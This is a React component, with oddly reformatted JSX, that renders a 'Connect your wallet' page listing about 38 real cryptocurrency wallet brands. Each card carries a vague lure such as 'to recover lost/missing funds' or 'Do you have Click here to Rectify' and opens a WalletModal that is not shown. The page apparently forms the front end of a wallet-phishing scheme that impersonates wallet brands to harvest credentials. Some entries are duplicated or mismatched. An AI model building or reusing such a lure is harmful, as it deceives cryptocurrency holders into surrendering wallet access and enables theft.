import React, {
    useState
} from "react";
import {
    v4 as uuidv4
} from "uuid";
import {
    Card,
    Image
} from "react-bootstrap";
import circleBall from "../assets/icons/circleball.png";
import dashboardIcon from "../assets/icons/dashboardicon.png";
import graphIcon from "../assets/icons/graphicon.png";
import roundBalls from "../assets/icons/roundballs.png";
import WalletModal from "./WalletModal";

import bitPay from "../assets/logo/icn-bitpay.jpg";
import tokenPocket from "../assets/logo/icn-token-pocket.jpg";
import torus from "../assets/logo/icn-torus.jpg";
import blockchain from "../assets/logo/blockchain-logo.png";
import crypto from "../assets/logo/icn-crypto.png";
import aaveWallet from "../assets/logo/icn-aave-wallet.png";
import atomicWallet from "../assets/logo/icn-atomic-wallet.png";
import binance from "../assets/logo/icn-binance-smart-chain.png";
import coimoniWallet from "../assets/logo/icn-coinmoni-wallet.png";
import digitxWallet from "../assets/logo/icn-digitx-wallet.png";
import eldooWallet from "../assets/logo/icn-eidoo-wallet.png";
import enjinWallet from "../assets/logo/icn-enjin-wallet.png";
import formatic from "../assets/logo/icn-formatic.png";
import moneroWallet from "../assets/logo/icn-monero-wallet.png";
import portis from "../assets/logo/icn-portis.png";
import protocol from "../assets/logo/icn-protocol.png";
import trezor from "../assets/logo/icn-trezor.png";
import trustWallet from "../assets/logo/icn-trust-wallet.png";
import ronin from "../assets/logo/ronin.png";
import solana from "../assets/logo/solana.png";
import others from "../assets/logo/undraw_Confirmation_re_b6q5.png";
import authereum from "../assets/logo/icn-authereum.svg";
import coinbase from "../assets/logo/icn-coinbase.svg";
import ledger from "../assets/logo/icn-ledger.svg";
import metaMask from "../assets/logo/icn-meta-mask.svg";
import phantom from "../assets/logo/phantom.webp";
import squarelink from "../assets/logo/icn-squarelink.png";
import walletConnect from "../assets/logo/wallet-connect.png";
import celo from "../assets/logo/celo-wallet.png";
import polka from "../assets/logo/polkawallet.png";
import neoxa from "../assets/logo/neoxa.png";
import firefly from "../assets/logo/firefly.png";
import terra from "../assets/logo/terra.png";
import nearProtocol from "../assets/logo/near-protocol.png";
import kepler from "../assets/logo/kepler.png";
import coinomi from "../assets/logo/coinomi.png";
import exodus from '../assets/logo/exodus.svg';

const AccessWc = () => {
    const [show, setShow] = useState(false);
    const [current, setCurrent] = useState([]);

    const setCurrentWallet = (wallet) => {
        setCurrent(wallet);
        onShow();
    };

    const onShow = () => {
        setShow(true);
    };

    const onHide = () => {
        setShow(false);
    };

    const dashboardCards = [{
            cardIcon: trustWallet,
            title: "TrustWallet",
            linkText: "for any issues with swapping/exchange of coins",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: metaMask,
            title: "Metamask",
            linkText: "to connect decentralised web applications to mobile wallets or enable DApp on mobile wallets/extension.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: walletConnect,
            title: "WalletConnect",
            linkText: "to connect decentralised web applications to mobile wallets or enable DApp on mobile wallets/extension.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: coinbase,
            title: "Coinbase",
            linkText: "if you have issues logging into your wallet.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: ledger,
            title: "Ledger",
            linkText: "to recover lost/missing funds.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: trezor,
            title: "Trezor",
            linkText: "to Rectify.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: formatic,
            title: "Formatic",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: portis,
            title: "Portis",
            linkText: "Do you have Click here to Rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: tokenPocket,
            title: "Token Pocket",
            linkText: "for any issues with swapping/exchange of coins",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: crypto,
            title: "Crypto.com",
            linkText: "to connect decentralised web applications to mobile wallets or enable DApp on mobile wallets/extension.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: coimoniWallet,
            title: "Coimoni Wallet",
            linkText: "if you have issues logging into your wallet.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: aaveWallet,
            title: "AAVE Wallet",
            linkText: "to recover lost/missing funds.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: moneroWallet,
            title: "Monero Wallet",
            linkText: "to Rectify.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: binance,
            title: "Binance Smart Wallet",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: blockchain,
            title: "Blockchain",
            linkText: "Do you have Click here to Rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: bitPay,
            title: "Bitpay",
            linkText: "Token Pocket",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: digitxWallet,
            title: "Digitex",
            linkText: "Token Pocket",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: atomicWallet,
            title: "Atomic Wallet",
            linkText: "for any issues with swapping/exchange of coins",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: enjinWallet,
            title: "Enjin Wallet",
            linkText: "to connect decentralised web applications to mobile wallets or enable DApp on mobile wallets/extension.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: eldooWallet,
            title: "Eldoo Wallet",
            linkText: "if you have issues logging into your wallet.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: protocol,
            title: "Protocol",
            linkText: "to recover lost/missing funds.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: squarelink,
            title: "Squarelink",
            linkText: "to Rectify.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: torus,
            title: "Torus",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: ronin,
            title: "Ronin",
            linkText: "Do you have Click here to Rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: solana,
            title: "Solana",
            linkText: "for any issues with swapping/exchange of coins",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: phantom,
            title: "Phantom",
            linkText: "to connect decentralised web applications to mobile wallets or enable DApp on mobile wallets/extension.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: authereum,
            title: "Authereum",
            linkText: "if you have issues logging into your wallet.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: celo,
            title: "Celo",
            linkText: "if you have issues logging into your wallet.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: neoxa,
            title: "Neoxa",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: firefly,
            title: "Firefly",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: terra,
            title: "Terra",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: polka,
            title: "Polka",
            linkText: "to recover lost/missing funds.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        }, {
            cardIcon: exodus,
            title: "Exodus",
            linkText: "Do you have Click here to Rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: nearProtocol,
            title: "Near Wallet",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: kepler,
            title: "Kepler",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: coinomi,
            title: "Coinomi",
            linkText: "Do you have any issues with transactions to rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: exodus,
            title: "Exodus",
            linkText: "Do you have Click here to Rectify",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
        {
            cardIcon: others,
            title: "Others",
            linkText: "to recover lost/missing funds.",
            id: uuidv4(),
            onClick: (card) => setCurrentWallet(card),
        },
    ];
    return ( <
        >
        <
        div className = 'container-fluid px-0' >
        <
        div className = 'container-fluid d-flex justify-content-center align-items-center bg-accent sticky-top wallet__connect'
        style = {
            {
                height: "10vh"
            }
        } >
        <
        h5 style = {
            {
                color: "antiquewhite"
            }
        } > Connect your wallet < /h5> <
        /div> <
        div className = 'container-fluid d-flex justify-content-end align-items-center px-0' >
        <
        Card className = 'bg-white dashboard__card px-3 py-3 access__wc__card' >
        <
        Card.Body className = 'd-flex flex-column align-items-start'
        style = {
            {
                gap: ".5rem"
            }
        } >
        <
        div className = 'container-fluid' >
        <
        div className = 'row gy-3' > {
            dashboardCards.map((card, index) => ( <
                div className = 'col-sm-12 col-md-12 col-lg-6 px-0'
                key = {
                    index
                } >
                <
                Card className = 'access__wc__cards px-1 me-3'
                onClick = {
                    () => card.onClick(card)
                } >
                <
                Card.Body className = 'py-2' >
                <
                div className = 'd-flex align-items-center justify-content-between h-100' >
                <
                p className = 'text-dark my-auto' > {
                    card.title
                } < /p> <
                Image src = {
                    card.cardIcon
                }
                fluid className = 'access__wc__icon' /
                >
                <
                /div> <
                /Card.Body> <
                /Card> <
                /div>
            ))
        } <
        /div> <
        /div> <
        /Card.Body> <
        /Card> <
        /div> <
        /div> <
        WalletModal show = {
            show
        }
        onHide = {
            onHide
        }
        wallet = {
            current
        }
        /> <
        />
    );
};

export default AccessWc;